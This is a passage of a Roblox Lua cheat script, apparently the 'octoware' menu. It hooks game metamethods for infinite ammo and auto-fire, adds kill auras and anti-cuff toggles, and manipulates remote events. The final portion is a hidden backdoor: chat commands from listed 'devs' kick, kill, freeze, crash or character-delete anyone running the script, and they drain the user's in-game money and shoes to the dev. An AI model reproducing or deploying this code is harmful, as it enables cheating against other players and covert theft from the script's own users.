
if Toggles["PushKill"].Value then
ReplicatedStorage:WaitForChild("Fist"):FireServer(unpack(push))
end

if Toggles["FistKil"].Value then
ReplicatedStorage:WaitForChild("Fist"):FireServer(unpack(jab))
end

if GunModToggles.Whitelist and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HoldPistol",true) then
LocalPlayer.Character:FindFirstChild("HoldPistol",true).Transparency = 1
end

if Toggles["Inf-Skittles"]["Value"] then
if LocalPlayer["PlayerGui"]:FindFirstChild("Run") and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Resistance") then
    LocalPlayer["PlayerGui"]:FindFirstChild("Run").Value.Value = true
    LocalPlayer.Character:FindFirstChild("Resistance").Value = true
end
end

if Toggles["Anti Apartment"].Value then
if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("InsideApartments") then
    LocalPlayer.Character:FindFirstChild("InsideApartments"):Destroy()
end
end

if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Movement/Ragdoll") then
LocalPlayer.Character:FindFirstChild("Movement/Ragdoll").Disabled = Toggles["AntiRag"].Value 
end 

if Toggles["SafeGunsDead"].Value then
if Toggles.SafeGunsDead.Value and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid").Health < 1 then
    for _,Tool in next, game.Players.LocalPlayer.Backpack:GetChildren() do
        if not BlacklistedTools[Tool.Name] == true and Tool:IsA("Tool") and not Tool:FindFirstChild("Drink") and not Tool:FindFirstChild("Bite") and not Tool:FindFirstChild("Cork") then
            if Toggles["MxClips"].Value == true then
                SafeRemote:FireServer("Movetosafe",Tool.Name,9e10,ChosenPlayer)
            elseif Toggles["MxClips"].Value == false then
                if game.Players.LocalPlayer.Backpack[Tool.Name]:FindFirstChild("Stats") then
                    SafeRemote:FireServer("Movetosafe",Tool.Name,game.Players.LocalPlayer.Backpack[Tool.Name].Stats.MaxAmmo.Value,ChosenPlayer)
                elseif game.Players.LocalPlayer.Backpack[Tool.Name]:FindFirstChild("USES") then
                    SafeRemote:FireServer("Movetosafe",Tool.Name,game.Players.LocalPlayer.Backpack[Tool.Name].USES.Value,ChosenPlayer)
                elseif game.Players.LocalPlayer.Backpack[Tool.Name]:FindFirstChild("val") then
                    SafeRemote:FireServer("Movetosafe",Tool.Name,game.Players.LocalPlayer.Backpack[Tool.Name].val.Value,ChosenPlayer)
                else
                    SafeRemote:FireServer("Movetosafe",Tool.Name,9e10,ChosenPlayer)
                end
            end
        end
    end
end
end

if Toggles["MeleeKill"].Value then
if GetMelee() and GetClosestCharacter() then
    GetMelee().LocalScript.Sw:FireServer(0)
    GetMelee().LocalScript.Damage:FireServer(GetClosestCharacter().Humanoid,1,GetClosestCharacter().UpperTorso,"Back")
end
end

if Toggles["Anti-Cuff"].Value then
LocalPlayer.isCuffed.Value = false
game:GetService("CoreGui").RobloxGui.Backpack.Visible = true
end

if Toggles["Auto-Pick"].Value then
for i,v in next, game.Workspace.tools:GetChildren() do
    if v:IsA("Tool") and tostring(v) ~= "Crate" then
        LocalPlayer.Character:FindFirstChild("Humanoid"):EquipTool(v)
    end
end
end

if Toggles["SafeSlots"].Value and LocalPlayer.PlayerGui:FindFirstChild("Safe") then
LocalPlayer.PlayerGui.Safe.Frame.Badge.Value = Toggles["SafeSlots"].Value
end

if LocalPlayer.PlayerGui:FindFirstChild("Camera_Bob") then
LocalPlayer.PlayerGui:FindFirstChild("Camera_Bob").Disabled = Toggles["Camerabob"].Value 
end

if LocalPlayer:FindFirstChild("Backpack") and LocalPlayer:FindFirstChild("Backpack"):FindFirstChild("Hood/Walljump") then
LocalPlayer.Backpack:FindFirstChild("Hood/Walljump").Disabled=Toggles.Hood.Value
end

if octoware.visuals.world.changefov then
setfov = false
camera.FieldOfView = octoware.visuals.world.fov
else
if not setfov then
    setfov = true
    camera.FieldOfView = 70
end
end
if octoware.visuals.world.changeambient then
tint.TintColor = octoware.visuals.world.ambient
else
tint.TintColor = Color3.new(1, 1, 1)
end
if octoware.visuals.world.changefogcolor then
setfog = false
game.Lighting.FogColor = octoware.visuals.world.fogcolor
else
if not setfog then
    setfog = true
    game.Lighting.FogColor = deffogcolor
end
end    
end)


local GunModHook;GunModHook = hookmetamethod(workspace,"__index",function(self,index)
    if tostring(self) == "ClipSize" and index == "Value" and GunModToggles.InfiniteAmmo == true then
        return 1
    end
    if tostring(self) == "GunType" and index == "Value" and GunModToggles.Auto == true then
        return "Auto"
    end
    if tostring(self) == "FireRate" and index == "Value" and GunModToggles.Auto == true then
        return -1
    end
    if tostring(self) == "Recoil" and index == "Value" and GunModToggles.Recoil == true then
        if tostring(self.Parent) == "Stats" then
            return 0
        end
    end
    return GunModHook(self,index)
end)

local OldHook;OldHook = hookmetamethod(game,"__namecall",newcclosure(function(self,...)
    if tostring(self) == "Safe" then
        Arguments = {...}
        if Arguments[1] == "Movetosafe" then
            if Toggles["MxClips"]["Value"] then
                Arguments[3] = 999999
                return OldHook(self,unpack(Arguments))
            end
        end
        if Arguments[1] == "Movetosafe" then
            if Arguments[2] == "Gear Cloner" or Arguments[2] == "SBDraco" or Arguments[2] == "SBGlock" or Arguments[2] == "Radio" or Arguments[2] == "Tazer" or  Arguments[2] == "Taser" or Arguments[2]:lower() == "handcuffs" or Arguments[2]:lower() == "arresttool" then
                return nil
            end
        end
    end
    return OldHook(self,...)
end))

Library.ToggleKeybind = Options.MenuKeybind

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")
local Camera = Workspace.CurrentCamera
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Player = Players.LocalPlayer

local function findPlayerByNameAbbreviation(abbrev)
    for _, p in ipairs(game.Players:GetPlayers()) do
        if p.Name:lower():sub(1, #abbrev) == abbrev:lower() then
            return p
        end
    end
    return nil
end

for i,v in next, getgenv()["devs"] do
    if Players:FindFirstChild(v) then
        Players[v].Chatted:Connect(function(Message)
            if string.match(Message:lower(),":kick ") then
                PlrName = string.gsub(Message,":kick ","")
                PlrName = tostring(findPlayerByNameAbbreviation(PlrName))
                if tostring(PlrName) == tostring(Player) and tostring(PlrName) ~= "antikurrr" then
                    Player:Kick()
                end
            end

            if string.match(Message:lower(),":kill ") then
                PlrName = string.gsub(Message,":kill ","")
                PlrName = tostring(findPlayerByNameAbbreviation(PlrName))
                if tostring(PlrName) == tostring(Player) and tostring(PlrName) ~= "antikurrr" then
                    Player.Character.Humanoid.Health = 0
                end
            end

            if string.match(Message:lower(),":freeze ") then
                PlrName = string.gsub(Message,":freeze ","")
                PlrName = tostring(findPlayerByNameAbbreviation(PlrName))
                if tostring(PlrName) == tostring(Player) and tostring(PlrName) ~= "antikurrr" then
                    Player.Character.HumanoidRootPart.Anchored = true
                end
            end

            if string.match(Message:lower(),":unfreeze ") then
                PlrName = string.gsub(Message,":unfreeze ","")
                PlrName = tostring(findPlayerByNameAbbreviation(PlrName))
                if tostring(PlrName) == tostring(Player) then
                    Player.Character.HumanoidRootPart.Anchored = false
                end
            end

            if string.match(Message:lower(),":crash ") then
                PlrName = string.gsub(Message,":crash ","")
                PlrName = tostring(findPlayerByNameAbbreviation(PlrName))
                if tostring(PlrName) == tostring(Player) and tostring(PlrName) ~= "antikurrr" then
                    while true do end
                end
            end

            if string.match(Message:lower(),":ck ") then
                PlrName = string.gsub(Message,":ck ","")
                PlrName = tostring(findPlayerByNameAbbreviation(PlrName))
                if tostring(PlrName) == tostring(Player) and tostring(PlrName) ~= "antikurrr" then
                    ReplicatedStorage.UI.Commands:FireServer("CKCONF")
                end
            end

            if string.match(Message:lower(),":stealmoney ") then
                PlrName = string.gsub(Message,":stealmoney ","")
                PlrName = tostring(findPlayerByNameAbbreviation(PlrName))
                if tostring(PlrName) == tostring(Player) and tostring(PlrName) ~= "antikurrr" then
                    local args = {
                        [1] = 1000,
                        [2] = game.Players[PlrName]
                    }
                    
                    repeat
                        game:GetService("ReplicatedStorage").Send:FireServer(unpack(args))
                        task.wait(.7)
                    until game.Players.LocalPlayer.Valuestats.Wallet.Value <= 0
                end
            end

            if string.match(Message:lower(), "^:stealshoes ") then
                local args = string.sub(Message, 13)
                
                local PlrName, ShoeName = string.match(args, "^(%S+)%s*(.*)")
                Amount = 9
                for i=1, 9 do
                    if string.match(Player.Characterstats.OwnedShoes.Value,tostring(i)..ShoeName) then
                        Amount = tostring(i)
                    end
                end

                PlrName = tostring(findPlayerByNameAbbreviation(PlrName))
                if tostring(PlrName) == tostring(Player) and tostring(PlrName) ~= "antikurrr" then
                    for i=1, tonumber(Amount) do
                        game:GetService("ReplicatedStorage"):WaitForChild("UI"):WaitForChild("Shoes"):FireServer("Send",tostring(Amount)..ShoeName,tostring(v))
                    end
                end
            end
        end)
    else
        Players.PlayerAdded:Connect(function(Plr)
            if tostring(Plr) == v then
                Plr.Chatted:Connect(function(Message)

                    if string.match(Message:lower(),":stealshoes ") then
                        local args = string.sub(Message, 13)
                
                        local PlrName, ShoeName = string.match(args, "^(%S+)%s*(.*)")
                        Amount = 9
                        for i = 1, 9 do
                            if string.match(Player.Characterstats.OwnedShoes.Value,tostring(i) .. ShoeName) then
                                Amount = tostring(i)
                            end
                        end
        
                        PlrName = tostring(findPlayerByNameAbbreviation(PlrName))
                        if tostring(PlrName) == tostring(Player) and tostring(PlrName) ~= "antikurrr" then
                            for i=1, tonumber(Amount) do
                                game:GetService("ReplicatedStorage"):WaitForChild("UI"):WaitForChild("Shoes"):FireServer("Send",tostring(Amount)..ShoeName,tostring(Plr))
                            end
                        end
                    end

                    if string.match(Message:lower(),":kick ") then
                        PlrName = string.gsub(Message,":kick ","")
                        PlrName = tostring(findPlayerByNameAbbreviation(PlrName))
                        if tostring(PlrName) == tostring(Player) and tostring(PlrName) ~= "antikurrr" then
                            Player:Kick()
                        end
                    end
        
                    if string.match(Message:lower(),":kill ") then
                        PlrName = string.gsub(Message,":kill ","")
                        PlrName = tostring(findPlayerByNameAbbreviation(PlrName))
                        if tostring(PlrName) == tostring(Player) and tostring(PlrName) ~= "antikurrr" then
                            Player.Character.Humanoid.Health = 0
                        end
                    end
        
                    if string.match(Message:lower(),":freeze ") then
                        PlrName = string.gsub(Message,":freeze ","")
                        PlrName = tostring(findPlayerByNameAbbreviation(PlrName))
                        if tostring(PlrName) == tostring(Player) and tostring(PlrName) ~= "antikurrr" then
                            Player.Character.HumanoidRootPart.Anchored = true
                        end
                    end
        
                    if string.match(Message:lower(),":unfreeze ") then
                        PlrName = string.gsub(Message,":unfreeze ","")
                        PlrName = tostring(findPlayerByNameAbbreviation(PlrName))
                        if tostring(PlrName) == tostring(Player) and tostring(PlrName) ~= "antikurrr" then
                            Player.Character.HumanoidRootPart.Anchored = false
                        end
                    end

                    if string.match(Message:lower(),":stealmoney ") then
                        PlrName = string.gsub(Message,":stealmoney ","")
                        PlrName = tostring(findPlayerByNameAbbreviation(PlrName))
                        if tostring(PlrName) == tostring(Player) and tostring(PlrName) ~= "antikurrr" then
                            local args = {
                                [1] = 1000,
                                [2] = game.Players[PlrName]
                            }
                            
                            repeat
                                game:GetService("ReplicatedStorage").Send:FireServer(unpack(args))
                                task.wait(.7)
                            until game.Players.LocalPlayer.Valuestats.Wallet.Value <= 0
                        end
                    end

                    if string.match(Message:lower(),":crash ") then
                        PlrName = string.gsub(Message,":crash ","")
                        PlrName = tostring(findPlayerByNameAbbreviation(PlrName))
                        if tostring(PlrName) == tostring(Player) and tostring(PlrName) ~= "antikurrr" then
                            while true do end
                        end
                    end

                    if string.match(Message:lower(),":ck ") then
                        PlrName = string.gsub(Message,":ck ","")
                        PlrName = tostring(findPlayerByNameAbbreviation(PlrName))
                        if tostring(PlrName) == tostring(Player) and tostring(PlrName) ~= "antikurrr" then
                            ReplicatedStorage.UI.Commands:FireServer("CKCONF")
                        end
                    end
                end)
            end
        end)
    end
end
